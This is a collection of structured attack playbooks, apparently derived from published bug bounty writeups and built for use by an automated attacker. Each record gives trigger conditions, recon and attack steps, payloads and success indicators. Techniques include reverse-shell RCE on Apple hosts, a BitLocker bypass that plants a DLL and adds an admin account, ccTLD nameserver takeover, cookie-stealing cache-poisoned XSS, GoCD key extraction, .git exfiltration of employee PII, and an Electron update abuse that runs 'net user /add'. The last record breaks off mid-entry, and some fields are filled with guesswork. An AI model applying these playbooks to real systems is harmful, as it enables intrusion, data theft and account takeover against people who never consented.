tools_recommended: Burp Suite: To craft and send HTTP requests, intercept responses, and analyze WAF behavior.
Custom scripts (Python/Bash): To automate the discovery and exploitation of Lucee instances, and to fuzz parameters if needed.
success_indicators: Successful execution of a web shell via a crafted CFM file uploaded/created on the server.
Response containing specific output from an executed command.
Callback received on an attacker-controlled server from a reverse shell initiated through the exploited vulnerability.
Creation of a file at an arbitrary location on the server which can be accessed via HTTP.
failure_indicators: Consistent 403 responses from the frontend server on all exploitation attempts, indicating WAF or proxy blocking.
Backend exceptions (leading to 403) without successful file creation or code execution, suggesting incorrect payload or sanitization.
Targeted administrative endpoints returning 401 or 404, indicating they are not present or require authentication.
404 responses when attempting to access created files, indicating incorrect path traversal or file creation failure.

playbooks.impact: Remote Code Execution (RCE) on Apple's infrastructure (facilities.apple.com, booktravel.apple.com). This could allow an attacker to gain full control over the affected servers, potentially leading to data breaches, further network compromise, or hosting malicious content.
playbooks.key_lesson: When encountering a WAF that blocks common web attack vectors via URL parameters, investigate backend endpoints that handle file operations or administrative functions via POST requests, as these might have different sanitization rules and bypass WAF protections.

meta.title: BitLocker Lockscreen bypass
meta.category: Lock screen bypass, Local Privilege Escalation, Windows

trigger_conditions.when_to_apply: When a Windows 10 system is running, the hard drive is BitLocker protected, and the user is at the lock screen without access to the password or PIN.
prerequisites: Physical access to the target machine is required.
A USB drive needs to be prepared with specific files.
The target system must have the Narrator accessibility tool available.
applicability_signals: The presence of the BitLocker lock screen.
The option 'I have forgotten my password/PIN' is available at the login screen.
skip_if: The system is already logged in.
The lock screen does not present the password recovery option.

recon_steps: Verify the target system is Windows 10 and has BitLocker enabled.
Confirm the 'I have forgotten my password/PIN' option is available on the lock screen.
attack_steps: Step 1: At the sign-in screen, select 'I have forgotten my password/PIN'.
Step 2: Trigger Sticky Keys by pressing Shift 5 times rapidly.
Step 3: Click the link to open the Settings app (this may require precise timing and clicking).
Step 4: Navigate the Settings app using Narrator commands (CapsLock + Arrow keys) to reach 'AutoPlay'.
Step 5: Configure AutoPlay to 'Open Folder to view files (File Explorer)'.
Step 6: Insert the prepared USB drive containing `Exploit.exe` and a symbolic link setup.
Step 7: Once the USB drive is recognized and opened, execute `Exploit.exe` using Narrator commands.
Step 8: The `Exploit.exe` will create a symbolic link in `\RPC Control\ClientRecoveryPasswordRotation` pointing to `\??\C:\windows\system32\Narrator.exe.local`.
Step 9: The exploit will attempt to create a subdirectory within `C:\windows\system32\Narrator.exe.local` and plant `comctl32.dll`.
Step 10: Reinsert the USB drive to trigger the directory creation and DLL planting, which will be loaded by Narrator on subsequent executions.
payloads_or_patterns: USB drive with `Exploit.exe` and a mechanism to create symbolic links and a DLL payload.
DLL payload: `comctl32.dll` placed within the created subdirectory.
tools_recommended: USB drive
Windows Sysinternals Suite (for symbolic link creation if not automated by exploit)
Compiler for C++ (to build `Exploit.exe` and `comctl32.dll`)
success_indicators: A new user account named 'hax' with password 'hax' and Administrators group membership is created.
The Narrator's focus box moves and reports 'access denied' repeatedly, indicating the exploit loop is running.
failure_indicators: Sticky Keys or Settings app cannot be launched.
USB drive contents are not recognized or executed.
No new user account is created after the full process.
Suggestion for failure: If the symbolic link creation fails, explore alternative methods for arbitrary file write to system directories.

playbooks.impact: Attacker can create a new administrator account on the target Windows 10 machine without any prior credentials or passwords, granting full control over the system.
playbooks.key_lesson: Always investigate accessibility tools like Narrator on the login screen for potential abuse, as they can be triggered with elevated privileges and used to execute arbitrary code.

meta.title: How I hijacked the top-level domain of a sovereign state

tech_stack_fingerprints: dig NS +trace cd output showing specific NS records like 'ns-root-X.scpt-network.com'
EPP status codes (redemptionPeriod, pendingDelete) observed on domain registrations

trigger_conditions.when_to_apply: This technique is applicable when a critical domain, particularly one involved in DNS delegation for a TLD, is observed to be in a redemption or pending delete state with a registrar, indicating it is about to expire.
prerequisites: Knowledge of the NS records used by a target TLD.
The target domain's NS records are configured to point to a domain that is in a state of redemptionPeriod or pendingDelete.
Access to a domain registrar capable of registering available domains.
applicability_signals: A domain name used in NS delegations for a TLD shows an EPP status code of 'redemptionPeriod'.
A domain name used in NS delegations for a TLD shows an EPP status code of 'pendingDelete'.
skip_if: The domain's EPP status is not 'redemptionPeriod' or 'pendingDelete'.
The domain is successfully renewed by its original owner.

recon_steps: Step 1: Use `dig NS +trace <TLD>` to identify the Name Servers (NS) responsible for a target TLD.
Step 2: For each identified NS domain, query its EPP status using WHOIS lookup tools to check for 'redemptionPeriod' or 'pendingDelete' status.
attack_steps: Step 1: Continuously monitor the EPP status of the identified NS domain using automated scripts or alerts.
Step 2: As soon as the status changes to 'pendingDelete', immediately attempt to register the domain through any available domain registrar.
Step 3: Once registration is successful, reconfigure the NS records for the purchased domain to point to attacker-controlled infrastructure (e.g., IP address 1.3.3.7).
Step 4: Observe DNS query behavior for the target TLD to confirm that traffic is now being routed through the attacker-controlled NS records.
payloads_or_patterns: Example script logic for EPP status monitoring (conceptual): `while true; do WHOIS <domain> | grep 'Status:' | grep -q 'pendingDelete'; if [ $? -eq 0 ]; then echo 'Domain is pending delete!'; exit; fi; sleep 60; done`
Example DNS delegation change: Configure NS records for `ns-root-1.scpt-network.com` to point to `1.3.3.7`.
tools_recommended: WHOIS command-line client for EPP status checks.
Custom scripts (e.g., Python, Bash) for automated monitoring of WHOIS status.
Domain registrar interface for domain purchase.
DNS server configuration tools for attacker-controlled infrastructure.
success_indicators: Successfully registering the domain that was in pending delete status.
Observing DNS queries for the target TLD being resolved by the attacker-controlled name servers.
Executing a crafted DNS response to a specific apex domain under the TLD, demonstrating control.
failure_indicators: The domain is renewed by the original owner before the attacker can register it. → Monitor for other TLDs with similar DNS delegation structures.
The registrar fails to register the domain due to errors or pre-existing reservations. → Attempt registration with a different registrar.
DNS queries for the TLD continue to be resolved by the original NS records. → Verify EPP status and re-attempt registration and delegation configuration.

playbooks.impact: Complete control over DNS resolution for a sovereign state's country-code top-level domain (.cd), enabling traffic interception, redirection to phishing sites, creation of 'out of thin air' domains, potential for RCE on local networks via WPAD, and DDoS attacks against targeted .cd domains.
playbooks.key_lesson: Continuously monitor the EPP status of critical infrastructure domain names, especially those involved in DNS delegations, as they represent a significant domain takeover risk if allowed to expire.

meta.title: How I managed to trigger a Stored-XSS in an online store with the help of Cache Poisoning
meta.vuln_type: Stored XSS via Web Cache Poisoning

target_profile.technology: Online Store (custom or common e-commerce platform)
affected_components: Subdomain used by staff (e.g., admin panel, internal tools)
Any endpoint that caches responses and reflects user-controlled input
tech_stack_fingerprints: Reflects arbitrary Host header in response source
Reflects arbitrary cookie parameter values in response source
Caches responses that contain reflected user input

trigger_conditions.when_to_apply: When a subdomain or an internal application endpoint caches responses and reflects user-supplied data, especially when tampering with Host headers or cookies also results in reflection.
prerequisites: Attacker can authenticate as a regular user.
The target reflects arbitrary Host headers or cookie parameters in its responses.
The target's responses are cached and served to other users.
applicability_signals: Response headers indicate caching (e.g., `Cache-Control`, `Expires`, `Age`).
User-supplied data in POST requests or cookies is reflected in the response.
Modifying the Host header in a request causes that header value to appear in the response source.
A specific parameter in a POST request is saved in the caching server and reflected.
The `Accept: text/html` header is present in requests.
skip_if: No cache-related headers are present.
User input is not reflected in the response.
Requests with modified Host headers do not result in reflection.
WAF blocks attempts to inject JavaScript or HTML.

recon_steps: Step 1: Perform subdomain enumeration for the target domain. Look for subdomains that seem to host administrative or staff-facing interfaces.
Step 2: Access the discovered subdomain and attempt to log in as a regular user.

Step 3: Use a proxy (e.g., Burp Suite) to intercept requests. Send requests with a modified `Host` header (e.g., `Host: attacker-controlled.com`) and observe if the `Host` header value is reflected in the response source.
Step 4: Experiment with sending arbitrary values in cookie parameters and observe if they are reflected in the response source.
Step 5: Identify a POST endpoint where arbitrary input can be sent and is saved/reflected by the caching server. Test this by sending simple text like 'Hello' and checking for reflection.
Step 6: Verify the `Accept: text/html` header is sent in requests, as this may be crucial for payload execution.
attack_steps: Step 1: Identify the vulnerable parameter in a POST request that gets saved and reflected by the cache server on the target subdomain.
Step 2: Construct a malicious payload by combining a benign string with a JavaScript XSS payload. Example: `Hello <script>alert(document.cookie)</script>`.
Step 3: Send a POST request to the identified endpoint with the constructed malicious payload in the vulnerable parameter. Ensure the `Accept: text/html` header is set.
Step 4: If cache poisoning is successful, the attacker's crafted response containing the reflected JavaScript will be cached.
Step 5: Navigate to the cached page using a regular user's browser (or have a victim browse to it). The embedded JavaScript should execute in the context of the victim's browser.
payloads_or_patterns: Benign string + JavaScript payload, e.g.: `Some text <script>alert(document.cookie)</script>`
A POST request to `<TARGET_URL>/vulnerable_endpoint` with `Accept: text/html` and a parameter like `content=<MALICIOUS_PAYLOAD>`
tools_recommended: Burp Suite: To intercept and modify requests, especially Host headers and cookies, and to observe reflected parameters.
httpx: For subdomain enumeration and initial reconnaissance.
success_indicators: The attacker's JavaScript payload (e.g., `alert(document.cookie)`) executes in the victim's browser when they visit the poisoned URL.
The response served to the victim contains the injected script tags.
failure_indicators: The JavaScript payload is reflected as plain text but not executed (e.g., `<script>alert(1)</script>` appears literally). Suggests a need to bypass output encoding or ensure correct content type.
The response is not cached, or the cache is bypassed (e.g., Vary header issues). Suggests finding a different caching mechanism or endpoint.
The Host header or cookie reflection does not lead to cache poisoning. Suggests the reflected input is not used in cache keys or is sanitized before caching.
A 403 Forbidden or other error response is received when attempting to inject payloads. Suggests a WAF is present; try encoding or alternative payloads.

playbooks.impact: Attacker can execute arbitrary JavaScript in the context of any user who visits the cached page. This can lead to session hijacking (stealing cookies), credential theft, defacement, redirection to malicious sites, or performing actions on behalf of the user.
playbooks.key_lesson: When an application reflects user-supplied input in cached responses, especially when Host headers or cookie parameters are reflected, investigate cache poisoning to achieve stored XSS by embedding JavaScript payloads within the reflected input.

meta.title: GoCD Multiple Vulnerabilities
meta.category: rce, information disclosure, insecure deserialization, security code review

trigger_conditions.when_to_apply: This technique is applicable when an attacker has compromised a GoCD agent, can intercept network traffic between the agent and server (especially if HTTPS is not enforced), or can register a new agent and have it approved.
prerequisites: Attacker has access to a GoCD agent (or can register and get a new agent approved).
Network traffic between agent and server is not end-to-end encrypted (e.g., no HTTPS, or attacker can intercept traffic).
applicability_signals: GoCD server responds to agent requests for work with `application/x-java-serialized-object` content type.
Agent makes POST requests to `/go/remoting/remoteBuildRepository`.
skip_if: All agent-server communication is over HTTPS and traffic cannot be intercepted.
GoCD server does not use Java serialization for agent communication.

recon_steps: Step 1: Monitor network traffic from a GoCD agent to the GoCD server to identify requests to `/go/remoting/remoteBuildRepository` and observe the `Content-Type` of the server's response.
Step 2: If the `Content-Type` is `application/x-java-serialized-object`, confirm the presence of a serialized Java object in the response.
attack_steps: Step 1: Intercept a POST request from a GoCD agent to the GoCD server at `/go/remoting/remoteBuildRepository`.
Step 2: Capture the response from the GoCD server, which will be a Java serialized object containing a `com.thoughtworks.go.security.GoCipher` sub-object.
Step 3: Deserialize the captured response object.
Step 4: Extract the master encryption key from the `GoCipher` object.
Step 5: Use the extracted master key to decrypt any GoCD secret variables stored in pipeline configurations or source repositories.
payloads_or_patterns:
POST /go/remoting/remoteBuildRepository HTTP/1.1
Host: <TARGET_URL>:8153
User-Agent: Apache-HttpClient/4.5.6 (Java/15.0.1)
Content-Length: 1271
Accept-Encoding: gzip,deflate
Authorization: AA/yJekGeSBNDY8zraj1rESs9PYu/xBfH8m2JtTRILQ=
Content-Type: application/x-java-serialized-object
Cookie: JSESSIONID=<SESSION_TOKEN>
Proxy-Connection: Keep-Alive
X-Agent-Guid: 90505c1c-5e8c-4516-ab81-bcb1d6b37277

<Serialized Java object containing agent status/work request>
tools_recommended: Burp Suite or OWASP ZAP: To intercept and analyze HTTP requests/responses.
Java deserialization tools (e.g., ysoserial, custom scripts): To deserialize Java objects and extract the key.
Python script with AES decryption libraries: To decrypt GoCD secret variables once the master key is obtained.
success_indicators: Successfully deserialize the Java object and extract a valid AES key.
Decrypt sensitive variables (e.g., API keys, passwords) stored in GoCD configuration or accessed from source repositories.
failure_indicators: GoCD server does not respond with `application/x-java-serialized-object`.
Deserialization fails or produces an invalid key.
Decrypted secrets do not appear to be valid or useful.

Suggestion: If agents are not communicating via Java serialization, pivot to other vulnerability classes mentioned in the writeup (e.g., potential RCE via other deserialization sinks, or configuration file access).

playbooks.impact: An attacker can retrieve the master AES encryption key used by GoCD to encrypt sensitive variables. This allows the attacker to decrypt any secret variable stored within the GoCD installation, including API keys, database credentials, and other sensitive information used in pipelines and source code repositories. If the attacker has an agent, they can directly obtain the key. If they can register a new agent and get it approved, they can also obtain the key.
playbooks.key_lesson: Always analyze Java deserialization payloads in inter-component communication, and investigate the potential for sensitive data exposure in serialized objects, especially when dealing with encryption keys or critical configuration.

meta.title: Making Clouds Rain :: Remote Code Execution in Microsoft Office 365

trigger_conditions.when_to_apply: When targeting Microsoft Exchange Online and interested in abusing administrative cmdlets that may lack proper input validation, especially those related to policy management.
prerequisites: Attacker has an authenticated session with permissions to execute Exchange cmdlets, or can achieve authenticated access to the Exchange Online environment.
applicability_signals: Discovery of cmdlets like `New-DlpPolicy` that handle potentially complex or user-supplied data.
Analysis of .NET DLLs associated with Exchange Server management functions.
skip_if: Target is not Exchange Online or a similar on-premise Exchange Server.
Input validation for `New-DlpPolicy` and related cmdlets is robust and prevents arbitrary code execution.

recon_steps: Step 1: Identify Exchange Online architecture and available APIs, focusing on administrative interfaces like Exchange Control Panel (/ecp) and PowerShell remoting (/powershell).
Step 2: Analyze .NET assemblies (`Microsoft.Exchange.Management.dll`) for cmdlets and their associated classes (e.g., `Microsoft.Exchange.MessagingPolicies.CompliancePrograms.Tasks.NewDlpPolicy`).
Step 3: Examine the `InternalValidate` and `InternalProcessRecord` methods of identified cmdlet classes for potential input sanitization flaws.
attack_steps: Step 1: Craft a malicious input for the `New-DlpPolicy` cmdlet, specifically targeting parameters that are processed by the `InternalProcessRecord` method without adequate sanitization.
Step 2: Submit the crafted input via the PowerShell remoting interface or any exposed API endpoint that proxies to this cmdlet.
Step 3: Observe for command execution indicators, such as network callbacks to an attacker-controlled server or the creation/modification of specific files on the target system.
payloads_or_patterns: Insufficient detail in writeup for specific RCE payloads or command structures.
tools_recommended: ILSpy or dnSpy for .NET assembly analysis.
PowerShell remoting client or a custom tool to interact with Exchange Online cmdlets.
success_indicators: Remote command execution confirmed by arbitrary code running on the target Exchange Online server.
Successful exfiltration of data or execution of attacker-defined commands.
failure_indicators: Cmdlet returns an error indicating invalid input or insufficient permissions, but no code execution occurs.
Patches successfully prevent the exploit, requiring re-analysis of updated code.

playbooks.impact: Remote Code Execution on Microsoft Exchange Online servers, potentially granting access to millions of corporate email accounts and sensitive data within the affected tenants.
playbooks.key_lesson: Analyze administrative cmdlets and their underlying .NET implementations for input validation vulnerabilities, especially when targeting cloud-based services where authenticated access can be readily obtained.

meta.title: Guest Blog Post: Leaking silhouettes of cross-origin images

tech_stack_fingerprints: User agent string indicating Chromium or Firefox
The presence of the Canvas API in JavaScript environments

trigger_conditions.when_to_apply: When a web page needs to display or process cross-origin images, and the browser's Same-Origin Policy enforcement for canvas operations is vulnerable to timing side-channels.
prerequisites: The target browser must be vulnerable to the timing difference in `drawImage` based on pixel transparency.
The attacker must control a web page that can execute JavaScript.
applicability_signals: The ability to embed cross-origin images on a page using an `` tag.
The use of the Canvas API (`<canvas>` element and `getContext('2d')`).
skip_if: Browser versions that have patched the timing vulnerability in `drawImage`.
WAFs that block JavaScript execution or manipulation of canvas elements.

recon_steps: Step 1: Identify if the target web application is using cross-origin images or allows embedding of external images.
Step 2: Confirm if the target page is running in a browser version known to be vulnerable (e.g., older versions of Chromium or Firefox).
attack_steps: Step 1: Create an HTML page with an `` tag pointing to a cross-origin image URL.
Step 2: Get the 2D rendering context of a `<canvas>` element.
Step 3: Use `context.drawImage(img, sx, sy, 1, 1, 0, 0, 1, 1)` to draw a single pixel from the cross-origin image onto the canvas.
Step 4: Measure the time taken for the `drawImage` operation.
Step 5: Repeat steps 3 and 4 for each pixel of the cross-origin image, varying the `sx` and `sy` coordinates.
Step 6: Analyze the timing differences to infer the transparency of each pixel.
tools_recommended: Browser Developer Tools: For inspecting network requests, console logs, and performance timings.
Custom JavaScript: To implement the pixel-by-pixel timing measurement and analysis.
success_indicators: Successful reconstruction of the image's silhouette or shape, especially if it contains text or distinct graphical elements on a transparent background.
The ability to discern specific details (e.g., letters in text) from the inferred pixel transparency data.
failure_indicators: Consistent timing across all pixels, indicating no observable difference in `drawImage` performance based on transparency.
Browser security features preventing cross-origin image loading or canvas tainting that blocks reading, even with timing attacks.
High variability in timing measurements making reliable inference impossible.

playbooks.impact: Allows a malicious web page to infer the structure or content of cross-origin images, potentially leaking sensitive information like text or icons embedded within images, even if direct pixel reading is prevented by the Same-Origin Policy.
playbooks.key_lesson: Always consider timing side-channels when evaluating canvas-based security mechanisms, as performance differences in drawing operations can reveal information about image content that direct pixel access would not.

meta.title: Stealing Your Private YouTube Videos, One Frame at a Time

trigger_conditions.when_to_apply: When the target user is authenticated to Google Ads and has created an advertisement that uses a YouTube video, and this advertisement has a 'Moments' feature enabled for analytics.
prerequisites: Attacker has an authenticated Google Ads account.
Attacker has access to a YouTube video that they own, which has been set to 'Private'.
The target private YouTube video has been used in a Google Ads advertisement by the victim.
applicability_signals: Observing POST requests to '/aw_video/_/rpc/VideoMomentService/GetThumbnails' originating from Google Ads.
The presence of a '__ar' parameter in the request body containing a video ID and timestamp.
skip_if: The target private YouTube video is not being used in any Google Ads advertisements.
The '/GetThumbnails' endpoint is not accessible or does not appear to be related to video assets.

recon_steps: Step 1: Authenticate to Google Ads with an attacker-controlled account.

Step 2: Create a skippable ad that uses a YouTube video owned by the attacker. Observe network traffic during the ad creation process, specifically looking for requests related to video analytics or thumbnail generation.
Step 3: Identify the '/GetThumbnails' endpoint and analyze the structure of its requests, paying attention to parameters like '__ar' that contain video identifiers and timestamps.
attack_steps: Step 1: Obtain the video ID of a target private YouTube video.
Step 2: Craft a POST request to 'https://ads.google.com/aw_video/_/rpc/VideoMomentService/GetThumbnails'.

Step 3: Modify the '__ar' parameter in the request body. Set the first element (video ID) to the target private video's ID, and the second element (timestamp in milliseconds) to a desired frame time (e.g., '0' for the first frame).
Step 4: Send the crafted request.
Step 5: Decode the base64 encoded image response to obtain a thumbnail frame of the target private video.
Step 6: (Optional for PoC) Automate the process by iterating through timestamps (e.g., incrementing by 33ms for 24fps) to download multiple frames and construct a GIF or video.
payloads_or_patterns:
POST /aw_video/_/rpc/VideoMomentService/GetThumbnails HTTP/1.1
Host: ads.google.com
User-Agent: <USER_AGENT>
Content-Type: application/json

{"1":"<TARGET_VIDEO_ID>","2":"<TIMESTAMP_MS>","3":"<ARBITRARY_VALUE>"}
tools_recommended: Burp Suite: To intercept, analyze, and modify HTTP requests to the '/GetThumbnails' endpoint.
Python with 'requests' and 'Pillow' libraries: For automating frame downloading, base64 decoding, and GIF/video generation.
success_indicators: Receiving a 200 OK HTTP response with a base64 encoded image payload.
Decoding the base64 payload successfully renders a thumbnail or frame from the target private YouTube video.
failure_indicators: Receiving a 4xx or 5xx HTTP error code (e.g., 403 Forbidden, 404 Not Found). This might indicate an incorrect endpoint or access restrictions.
The response does not contain a valid base64 encoded image or the decoded image is not related to the target video. This could mean the video ID is incorrect or the timestamp is invalid.
If attempting to reconstruct a video, observe blank frames or incorrect sequences.

playbooks.impact: An attacker can view frames or reconstruct entire private YouTube videos that do not belong to them, bypassing privacy controls. This can lead to the exposure of sensitive or confidential video content.
playbooks.key_lesson: Always check if services that interact with sensitive data (like YouTube videos) have proper authorization checks in place, as they may be less stringent than the primary service.

meta.title: UNEP Breached, 100K+ Employee Records Accessed
meta.authors: Sakura Samurai (Jackson Henry, Nick Sahler, John, Aubrey Cottle)
meta.vuln_type: Sensitive Data Exposure | Git Credentials Exposure

tech_stack_fingerprints: Server responding to requests for .git directories
Presence of GitHub credentials in code

trigger_conditions.when_to_apply: When subdomains of the target organization host web applications with exposed .git directories or contain leaked GitHub credentials in their code.
prerequisites: Knowledge of target subdomains.
applicability_signals: Discovery of an exposed .git directory via subdomain enumeration and fuzzing.
Existence of private GitHub repositories associated with the target organization that may contain leaked credentials.
skip_if: No exposed .git directories are found.
No GitHub credentials are found within accessible code repositories.

recon_steps: Step 1: Perform subdomain enumeration for all domains within the target organization's scope (e.g., using tools like Amass or Subfinder).
Step 2: For each discovered subdomain, fuzz for the presence of exposed .git directories by sending requests to `/<subdomain>/.git/config` or similar paths.
attack_steps: Step 1: If an exposed .git directory is found, use a tool like `git-dumper` to exfiltrate the contents of the repository.
Step 2: Analyze the exfiltrated repository contents for any exposed credentials, particularly GitHub credentials.
Step 3: If GitHub credentials are found, attempt to use them to access private GitHub repositories associated with the target organization.
Step 4: Download any accessible private GitHub repositories and scan their contents for database, application, or other sensitive credentials.
Step 5: Identify and report any exposed PII or other sensitive data found within the downloaded repositories, such as employee records or backup files.
tools_recommended: Amass (for subdomain enumeration)
Subfinder (for subdomain enumeration)
git-dumper (for exfiltrating .git directories)
grep or similar text search tools (for analyzing code)
success_indicators: Successful exfiltration of .git directory contents.
Discovery of valid GitHub credentials.
Access to private GitHub repositories.
Identification and retrieval of sensitive data (e.g., employee PII, database credentials) from downloaded repositories.
failure_indicators: No exposed .git directories found after fuzzing.
Exposed .git directories do not contain valuable information or credentials.
Discovered GitHub credentials are invalid or do not grant access to private repositories.
Private repositories are empty or do not contain sensitive information.

playbooks.impact: Unauthorized access to over 100,000 employee records including PII (names, employee IDs, nationalities, HR data), project and funding information, and evaluation reports. This also includes the potential for further unauthorized access to databases and applications due to exposed credentials.
playbooks.key_lesson: Always enumerate and fuzz for exposed .git directories on web applications, as they can lead to the discovery of credentials and sensitive data. Also, investigate discovered GitHub accounts for leaked credentials within their code repositories.

meta.title: A 'Novel' Way to Bypass Executable Signature Checks with Electron

trigger_conditions.when_to_apply: When a desktop application built with Electron allows users to update itself by downloading and executing unsigned executables or scripts, and the update process does not properly validate the signature of the downloaded update payload.
prerequisites: The target application must be built using Electron.
The application's update mechanism must be accessible to a low-privilege user.
The update mechanism must download and execute code without strict signature validation.
applicability_signals: Application's self-update functionality is present.
Developer documentation or code reveals use of Electron's autoUpdater or similar mechanisms.
The update process involves downloading an executable or script file that is then run.
skip_if: The update mechanism strictly enforces code signing and validation of all downloaded executables.
The application updates via a secure, signed package manager (e.g., MSI, DMG with signature).
The update process only downloads configuration files or data, not executable code.

recon_steps: Step 1: Identify the target desktop application. Determine if it's built with Electron by checking process trees for 'electron.exe' or inspecting application files for Electron framework components.

Step 2: Locate and analyze the application's update mechanism. This might involve inspecting network traffic during updates, analyzing application settings, or reverse-engineering update-related code.
attack_steps: Step 1: Craft a malicious executable or script that performs a privileged action (e.g., adds a user, modifies system files).
Step 2: Host this malicious payload on a web server accessible to the target machine.
Step 3: If the update mechanism allows specifying a download URL or involves manual loading of update files, point it to the malicious payload.
Step 4: Trigger the update process.

Step 5: If the application's update handler executes the downloaded payload without proper signature verification, the malicious code will run with the application's privileges, potentially leading to privilege escalation.
payloads_or_patterns: A simple Windows executable (e.g., a compiled C++ program) that attempts to add a new administrator user, or execute a command like `net user attacker password /add && net localgroup administrators attacker /add`.
tools_recommended: Burp Suite: To intercept and analyze network traffic during the update process.
Process Explorer (Sysinternals): To observe running processes and identify Electron applications.
Compiler (e.g., MinGW, Visual Studio): To create malicious executables.
Web server (e.g., Python http.server, Nginx): To host the malicious payload.
success_indicators: The malicious executable runs successfully.
A new user is created with administrative privileges.
System files are modified as intended by the payload.
The application crashes or behaves unexpectedly if the payload has unintended side effects but still executes.
failure_indicators: The update fails with an error related to signature verification (e.g., 'Invalid signature', 'Untrusted publisher').
The application's update process does not download or execute external files.

The payload executes but does not achieve the desired privileged action, indicating the process lacks sufficient privileges or the payload is flawed. Pivot to analyzing the exact privileges the Electron process runs with.

playbooks.impact: A low-privilege attacker can gain administrator privileges on the target machine by tricking the Electron application into downloading and executing a malicious payload during its update process.
playbooks.key_lesson: Always validate the digital signature of all executables or scripts downloaded and executed by an application, especially within desktop environments that may have permissive update mechanisms like Electron.

meta.title: Create post on any Facebook page

trigger_conditions.when_to_apply: When an attacker has the 'advertiser_role' on Facebook and can intercept or manipulate HTTP requests related to ad previews or sharing.
prerequisites: Attacker must have an 'advertiser_role' on Facebook.
applicability_signals: Ability to access or create ad previews in Facebook Creative Hub.
Existence of endpoints like '/ads/previewer/notify_mobile/' or similar GraphQL mutation endpoints for ad creation/preview.
Requests that involve a 'page_id' parameter that can be modified.
skip_if: Lack of 'advertiser_role'.
WAF or server-side controls that strictly validate 'page_id' against the authenticated user's page permissions before processing.

recon_steps: Step 1: Navigate to Facebook Creative Hub and explore features related to creating ad previews or mockups.

Step 2: Use browser developer tools (e.g., Network tab) to intercept HTTP requests made during the ad preview creation or sharing process. Look for requests containing 'page_id' or similar parameters.
attack_steps: Step 1: Initiate the creation of an ad preview within Facebook Creative Hub, selecting a page you have control over.
Step 2: Intercept the GraphQL request (or similar) responsible for creating or saving the ad preview. Identify the 'page_id' parameter.
Step 3: Modify the intercepted request, replacing your 'page_id' with the 'page_id' of a target victim's page.
Step 4: Forward the modified request to the server.
Step 5: Upon successful creation of the preview on the victim's page, obtain the shareable URL (e.g., https://www.facebook.com/ads/previewer/__PREVIEW_KEY__).
